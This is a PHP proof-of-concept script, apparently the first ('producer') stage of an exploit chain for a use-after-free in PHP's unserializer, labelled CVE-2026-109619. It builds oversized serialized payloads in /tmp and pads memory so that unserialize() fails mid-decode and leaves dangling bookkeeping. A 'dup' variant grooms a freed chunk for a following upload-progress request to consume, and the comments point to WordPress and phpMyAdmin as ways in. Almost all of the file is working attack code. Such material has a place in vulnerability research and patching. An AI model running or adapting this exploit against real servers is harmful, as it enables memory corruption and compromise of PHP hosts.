<?php
/* CVE-2026-109619 producer for poc-a3, unserializer stale-bookkeeping family.
 *
 * The generic unserializer keeps shared bookkeeping for serialized references
 * and values awaiting destruction (php_var_unserialize_init() publishes it in
 * Basic's globals BG(unserialize)). A raw unserialize() call that hits the
 * memory_limit fatal mid-decode skips php_var_unserialize_destroy(): the
 * request heap is freed at request shutdown while BG(unserialize).data still
 * points into it and the nesting level stays nonzero. Nothing resets it
 * before the next request's request-startup multipart parsing (Basic's
 * RINIT would, but it runs after php_hash_environment()) - the upload-
 * progress consumer in poc-a3 is that next request.
 *
 * This is the php-fpm-compatible shape: the fatal happens inside application
 * code (after successful request startup), so the worker survives on every
 * SAPI. WordPress reaches the same decoder via maybe_unserialize(), phpMyAdmin
 * via session data. The payload is one huge serialized string kept in
 * /tmp/payload.ser (built on first use): unserialize() must copy it, and
 * that copy exceeds the remaining budget, so the limit fires inside the
 * live decoder. */
$len = (int)($_GET['len'] ?? 10000000);
$shape = $_GET['shape'] ?? '';
if ($shape === 'dup') {
    /* Grooming producer (CVE-2026-109619): a duplicate array key replaces a
     * refcounted element, which pushes it through var_push_dtor() into the
     * unserializer's dtor bookkeeping (a 4096-byte var_dtor_entries chunk)
     * *before* the huge string allocation OOMs. The bailout then leaves
     * BG(unserialize).data->last_dtor pointing at that freed chunk, whose
     * used_slots the next request's upload-progress session decode consumes
     * (tmp_var(): current = &last_dtor->data[used_slots]). */
    if (!file_exists('/tmp/payload2.ser')) {
        ini_set('memory_limit', '256M');
        file_put_contents('/tmp/payload2.ser',
            'a:3:{i:0;s:4:"aaaa";i:0;s:4:"bbbb";i:1;s:' . $len . ':"'
            . str_repeat('A', $len) . '";}');
        printf("payload built: %d bytes\n", $len + 64);
        exit;
    }
    if (isset($_GET['check'])) {
        /* Probe: payload ready, do not decode (keeps the producer as the
         * request immediately preceding the consumer). */
        printf("payload ready\n");
        exit;
    }
    $ser = file_get_contents('/tmp/payload2.ser');
} else {
    if (!file_exists('/tmp/payload.ser')) {
        ini_set('memory_limit', '256M');
        file_put_contents('/tmp/payload.ser', 's:' . $len . ':"' . str_repeat('A', $len) . '";');
        printf("payload built: %d bytes\n", $len + 32);
        exit;
    }
    $ser = file_get_contents('/tmp/payload.ser');
}
$limit = ini_parse_quantity(ini_get('memory_limit'));
$pad = str_repeat('P', max(0, $limit - memory_get_usage() - strlen($ser) - 200000));
printf("decoding %d bytes (%d left)...\n", strlen($ser), $limit - memory_get_usage());
unserialize($ser);
printf("decode completed\n");
